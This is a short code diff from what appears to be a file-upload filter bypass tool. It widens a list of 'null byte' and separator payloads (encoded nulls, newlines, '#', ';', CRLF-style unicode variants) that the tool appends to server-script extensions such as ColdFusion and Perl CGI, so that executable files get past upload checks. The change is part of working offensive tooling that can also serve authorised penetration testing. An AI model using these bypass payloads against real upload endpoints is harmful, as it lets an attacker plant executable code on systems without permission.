@@ -557,7 +557,7 @@ def null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, head
            ".wSs", ".dO", ".aCtiOn"]
     coldfusion = [".cfm", ".cfml", ".cfc", ".dbm", ".cFm", ".cFml", ".cFc", ".dBm"]
     perl = [".pl", ".cgi", ".pL", ".cGi"]
-    null = ["%20", "%0a", "%00", "%0d%0a", "/", ".\\", ".", "...."]
+    null = ["%20", "%0a", "%00", "%0d%0a", "/", ".\\", ".", "\n", "\u000a", "%E5%98%8A", "#", "%23", "\u0023", ";" ,"%3B", "\u003b", "\u560a", "\u563b", "%E5%98%BB", "...."]
 
     print(termcolor.colored(f"[-] Trying null bytes at the end of the {EXTENSION} extensions technique!", 'magenta'))
     
